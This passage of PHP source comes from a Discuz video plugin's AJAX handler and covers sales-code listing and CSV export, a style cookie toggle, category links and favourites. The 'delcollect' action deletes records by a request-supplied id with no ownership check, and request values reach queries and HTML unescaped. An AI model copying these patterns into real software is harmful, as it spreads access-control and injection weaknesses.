	echo it618_video_getlang('s2285')."<font color=red>$count</font>"."it618_split".$salelist_get."it618_split".$multipage;
}


if($_GET['ac']=="salekm_get"){
	$shopadmin=explode(",",$it618_video['video_shopadmin']);
	if(!in_array($_G['uid'],$shopadmin)){
		if($it618_video_shop['it618_issalekm']==1){
			if($it618_video_shop['it618_uid']!=$_G['uid']){
				echo $it618_video_lang['s513'];exit;
			}
		}else{
			echo $it618_video_lang['s513'];exit;
		}
	}
	
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$ppp = 13;
	
	$count = C::t('#it618_video#it618_video_salekm')->count_by_search($it618sql,'id desc',$_GET['findtypeid'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$salesum= '<td colspan=15>'.it618_video_getlang('s2285').'<font color=red>'.$count.'</font><span style="float:right"></span></td>';
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getsalelist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
			
	foreach(C::t('#it618_video#it618_video_salekm')->fetch_all_by_search(
		$it618sql,'id desc',$_GET['findtypeid'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_video_salekm) {
		
		$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_salekm['it618_typeid']);
	
		$tmptitle=it618_video_getgoodstypename($it618_video_goods_type);
		
		$sale_get.='<tr class="hover">
		<td>(TID:'.$it618_video_salekm['it618_typeid'].') '.$tmptitle.'</td>
		<td>'.$it618_video_salekm['it618_code'].'</td>
		<td><a href="'.it618_video_rewriteurl($it618_video_salekm['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_salekm['it618_uid']).'</a></td>
		<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_salekm['it618_time']).'</font></td>
		</tr>';

	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $salesum.'it618_split'.$sale_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="salekm_dao"){
	$shopadmin=explode(",",$it618_video['video_shopadmin']);
	if(!in_array($_G['uid'],$shopadmin)){
		if($it618_video_shop['it618_issalekm']==1){
			if($it618_video_shop['it618_uid']!=$_G['uid']){
				echo $it618_video_lang['s513'];exit;
			}
		}else{
			echo $it618_video_lang['s513'];exit;
		}
	}
	
	$strtmp=$it618_video_lang['s2312']."\n";
	foreach(C::t('#it618_video#it618_video_salekm')->fetch_all_by_search(
		$it618sql,'id desc',$_GET['findtypeid'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],0,0
	) as $it618_video_salekm) {
		
		$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_salekm['it618_typeid']);
	
		$tmptitle=it618_video_getgoodstypename($it618_video_goods_type);
		
		$strtmp.=$it618_video_salekm['id'].",".$tmptitle.",".$it618_video_salekm['it618_code'].",".it618_video_getusername($it618_video_salekm['it618_uid']).'('.$it618_video_salejl['it618_uid'].')'.",".date('Y-m-d H:i:s', $it618_video_salekm['it618_time'])."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	if($_GET['it618_time1']!=''||$_GET['it618_time2']!=''){
		if($_GET['it618_time1']!=''){
			$timetmp1=str_replace("-","",$_GET['it618_time1']);
		}else{
			$timetmp1='null';
		}
		if($_GET['it618_time2']!=''){
			$timetmp2=str_replace("-","",$_GET['it618_time2']);
		}else{
			$timetmp2='null';
		}
		$timetmp=$timetmp1.'-'.$timetmp2;
	}
	$timestr=md5(date("YmdHis").FORMHASH).'_'.$timetmp. '_' . $datacount;
	it618_video_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_video/kindeditor/data/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="videostyle"){
	$videostyle=getcookie('videostyle');
	if($videostyle==''){
		if($it618_video['video_style']==3)$videostyle='1';else $videostyle='2';
	}
	if($videostyle=='1')$videostyle='2';else $videostyle='1';
	dsetcookie('videostyle',$videostyle);
	echo 'ok';
	exit;
}


if($_GET['ac']=="getproductclass"){
	$n=1;
	$classtmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'productclass2\',0,0)" name="productclass2"><span>'.$it618_video_lang['s466'].'</span><i></i></a>';
	foreach(C::t('#it618_video#it618_video_class2')->fetch_all_by_it618_class1_id($_GET['cid']) as $it618_tmp) {	
		$classtmp.='<a href="javascript:void(0)" onclick="setselect(\'productclass2\','.$n.','.$it618_tmp['id'].')" name="productclass2"><span>'.$it618_tmp['it618_classname'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $classtmp;
	exit;
}


if($_GET['ac']=="getcollect"){
	if($uid>0){
		$count=C::t('#it618_video#it618_video_collect')->count_by_uid_pid($uid,$_GET['pid']);
		if($count>0){
			C::t('#it618_video#it618_video_collect')->delete_by_uid_pid($uid,$_GET['pid']);
			echo '2';
		}else{
			C::t('#it618_video#it618_video_collect')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $_GET['pid'],
				'it618_time' => $_G['timestamp']
			), true);
			echo '1';
		}
	}
}


if($_GET['ac']=="delcollect"){
	if($uid>0){
		C::t('#it618_video#it618_video_collect')->delete_by_id($_GET['cid']);
		echo $it618_video_lang['s1656'];
	}
}

?>